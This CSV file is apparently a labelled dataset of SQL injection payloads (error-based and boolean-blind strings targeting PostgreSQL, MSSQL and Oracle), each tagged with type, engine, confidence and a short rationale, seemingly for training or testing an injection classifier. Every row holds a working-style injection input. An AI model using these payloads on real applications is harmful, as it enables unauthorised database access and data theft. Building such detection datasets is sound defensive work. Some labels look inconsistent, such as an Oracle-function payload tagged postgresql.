id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
39363,"select * from users WHERE username = ""-5863"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'xopg\' = \'xopg"" and username = ""1\' ) ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39364,1\' ) ) ) and ( ( ( \'njge\' like \'njge,unknown,generic,0.50,Insufficient data to classify payload type,1
39365,"select * from users WHERE username = ""1 and username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39366,"-3978 or username = ""-3899\' ) where 8152 = 8152 or username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'%\' = \'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39367,"select * from users WHERE username = ""-1641\' ) ) or username = ""-9553 ) ) or ( ( 5299 = 5299"" and username = ""-2495 ) ) as hudw where 4197 = 4197",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39368,"1 where 5161 = 5161 OR username = ""1%\' ) ) ) and ( ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
39369,"1\'|| ( select \'adiv\' from dual where 9842 = 9842 or username = ""-1254"" and ( ( ( \'sbey\' = \'sbey",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
39370,"-8353\' ) ) ) or username = ""-2806\' ) ) ) and ( ( ( \'rxzr\' = \'rxzr",unknown,generic,0.50,Insufficient data to classify payload type,1
39371,-8069\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'qbvz\' = \'qbvz,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39372,"select * from users WHERE username = ""1\' ) ) ) or username = ""-2374 ) and ( 2576 = 2576"" or username = ""-5863"" and username = ""1%\' ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39373,"select * from users WHERE username = ""-5863"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'xopg\' = \'xopg"" or username = ""1\' ) ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39374,"select * from users WHERE username = ""1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1\'+ ( select \'kicv\' where 1976 = 1976",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39375,1%\' ) and ( \'%\' = \',unknown,generic,0.50,Insufficient data to classify payload type,1
39376,"-1254"" and ( ( ( \'sbey\' = \'sbey",unknown,generic,0.50,Insufficient data to classify payload type,1
39377,"select * from users WHERE username = ""1\'|| ( select \'byxb\' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||\'"" or username = ""-2951",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39378,"select * from users WHERE username = ""-8860 ) or username = ""-7430\' ) as xfah where 1596 = 1596 or username = ""1\' )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39379,"-3978 and username = ""-9770\' ) ) as ovhh where 7903 = 7903 or username = ""1\'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39380,"1 and username = ""-5863",unknown,generic,0.50,Insufficient data to classify payload type,1
39381,"1%\' ) ) ) and username = ""-2756\' where 6156 = 6156 or username = ""-9847%\' ) ) ) and ( ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
39382,"select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""-2756\' where 6156 = 6156 or username = ""1\' )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39383,"select * from users WHERE username = ""1\' where 8537 = 8537 and username = ""1 ) and ( ( ( \'%\' = \'"" or username = ""1\' ) ) as bswc where 1635 = 1635 or username = ""-9501\' )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39384,-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39385,"select * from users WHERE username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627 and username = ""-1254"" and username = ""1",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39386,1%\' ) ) ) and ( ( ( \'%\' = \',unknown,generic,0.50,Insufficient data to classify payload type,1
39387,"select * from users WHERE username = ""1"" or username = ""-7242\' or username = ""-9564",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39388,"select * from users WHERE username = ""1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""-7874 ) ) )",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
39389,"select * from users WHERE username = ""1\'|| ( select \'yucg\' where 2576 = 2576 and username = ""-3733\' ) ) or username = ""1\'",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39390,"SELECT * FROM users WHERE username = ""1\' ) ) ) and ( ( ( \'njge\' like \'njge"" OR username = ""1\'+ ( select vohg where 6383 = 6383",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39391,"select * from users WHERE username = ""-1254"" or username = ""1 ) or username = ""1\'|| ( select \'yucg\' where 2576 = 2576",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39392,"select * from users WHERE username = ""1\' where 8537 = 8537 and username = ""1 ) and username = ""-1889%\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39393,"select * from users WHERE username = ""1 ) as nbno where 9816 = 9816 and username = ""-6523"" and username = ""-5062 ) where 7457 = 7457",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39394,"select * from users WHERE username = ""1 ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1"" or username = ""1\' where 8537 = 8537",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39395,"select * from users WHERE username = ""1"" or username = ""1 ) ) ) or username = ""1 ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39396,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1"" and username = ""-2495 ) ) as hudw where 4197 = 4197",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39397,"select * from users WHERE username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""-8860 ) and username = ""-2756\' where 6156 = 6156",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39398,"select * from users WHERE username = ""-1190\' and \'yxry\' like \'yxry"" and ( ( ( 1248 = 1248"" or username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39399,-7209\' ) ) ) and 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or ( ( ( 'stqx' = \'stqx,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39400,-3978 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39401,"-1641\' ) ) or username = ""-2756\' where 6156 = 6156 and username = ""-8353\' ) ) ) and ( ( ( \'ptlz\' = \'ptlz",unknown,generic,0.50,Insufficient data to classify payload type,1
39402,"-9564 and username = ""-6190\' ) where 2621 = 2621 and username = ""-3499\' ) ) ) and ( ( ( \'nzap\' like \'nzap",unknown,generic,0.50,Insufficient data to classify payload type,1
39403,"-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'yhku\' like \'yhku",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39404,"-9847%\' ) ) ) or username = ""-5313\' ) ) ) and ( ( ( \'wkkp\' like \'wkkp"" or username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
39405,"-4952\' ) ) ) OR username = ""1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39406,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'iuki\' = \'iuki"" or username = ""1\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39407,"-3424\' ) ) and username = ""1"" and username = ""-3978 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39408,"SELECT * FROM users WHERE username = ""1\'|| ( select \'vvpn\' from dual where 7011 = 7011 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||\'"" OR usErnamE = ""1 )",error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
39409,"select * from users WHERE username = ""-2806\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""-9847%\' ) ) )",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
39410,"select * from users WHERE username = ""1\' or username = ""1"" and username = ""-5062 ) where 7457 = 7457",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39411,"1\' where 8537 = 8537 and username = ""1"" or username = ""-9505\' ) ) ) and ( ( ( \'qhdg\' = \'qhdg",unknown,generic,0.50,Insufficient data to classify payload type,1
39412,"-3424\' ) ) and ( ( \'dyuo\' = \'dyuo"" or username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
39413,"select * from users WHERE username = ""1\' ) and ( \'ulkq\' = \'ulkq"" and username = ""-2495 ) ) as hudw where 4197 = 4197",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39414,"-4582 ) ) as gvfo where 8885 = 8885 and username = ""-2756\' where 6156 = 6156 or username = ""-1985 ) ) ) and ( ( ( 1248 = 1248",unknown,generic,0.50,Insufficient data to classify payload type,1
39415,"1 where 5161 = 5161 AND username = ""-6203\' ) ) ) and ( ( ( \'luee\' = \'luee",unknown,generic,0.50,Insufficient data to classify payload type,1
39416,"select * from users WHERE username = ""-4610\' ) ) and ( ( \'hdco\' = \'hdco"" and username = ""-3978 or username = ""-3899\' ) where 8152 = 8152",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39417,"-1344 ) as gqgi where 2545 = 2545 or username = ""1"" or username = ""1%\' ) ) and ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
39418,"select * from users WHERE username = ""-5863"" and ""gkvy"" = ""gkvy"" and ( ( ( \'xopg\' = \'xopg"" or username = ""-1254"" and username = ""1",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39419,"select * from users WHERE username = ""-8112\' ) ) ) and ( ( ( \'xopg\' = \'xopg"" or username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39420,"-7199\' and username = ""-1190\' and username = ""-1985 ) ) ) and ( ( ( 1248 = 1248",unknown,generic,0.50,Insufficient data to classify payload type,1
39421,"select * from users WHERE username = ""-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""1\'",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
39422,"1\'+ ( select oljg where 2006 = 2006 and username = ""1 ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 3505 = 3505",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39423,"select * from users WHERE username = ""-1254"" and username = ""-3899\' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-6353%\' ) ) or username = ""-7430\' ) as xfah where 1596 = 1596",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39424,"1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627 or username = ""-4952\' ) ) ) or username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39425,"1\'|| ( select \'byxb\' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||\'"" or username = ""-4262%\' ) ) ) || 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'%\' = \'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39426,-2348 ) as sige where 1639 = 1639 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39427,"1\' ) as pogx where 4105 = 4105 or username = ""-6353%\' ) ) and ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
39428,"-7430\' ) as xfah where 1596 = 1596 or username = ""-1641\' ) ) and ( ( ( \'btjx\' = \'btjx",unknown,generic,0.50,Insufficient data to classify payload type,1
39429,"select * from users WHERE username = ""-5863"" and ( ( ( \'itxy\' like \'itxy"" or username = ""1\' and username = ""-3899\' ) where 8152 = 8152",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39430,"select * from users WHERE username = ""-9770\' ) ) as ovhh where 7903 = 7903 or username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1%"" and username = ""1\' ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39431,"1%\' or username = ""-8069\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'qbvz\' = \'qbvz",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39432,"1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-2756\' where 6156 = 6156 or username = ""-7323%"" and ""%"" = """,boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
39433,"1\'|| ( select \'yucg\' where 2576 = 2576 and username = ""-3733\' ) ) and username = ""-6523"" and ""bwrb"" like ""bwrb",unknown,generic,0.50,Insufficient data to classify payload type,1
39434,"select * from users WHERE username = ""1%\' ) ) ) or username = ""-1254"" or username = ""1"" or username = ""1%\' ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39435,"1 or username = ""-5313\' ) ) ) and ( ( ( \'wkkp\' like \'wkkp",unknown,generic,0.50,Insufficient data to classify payload type,1
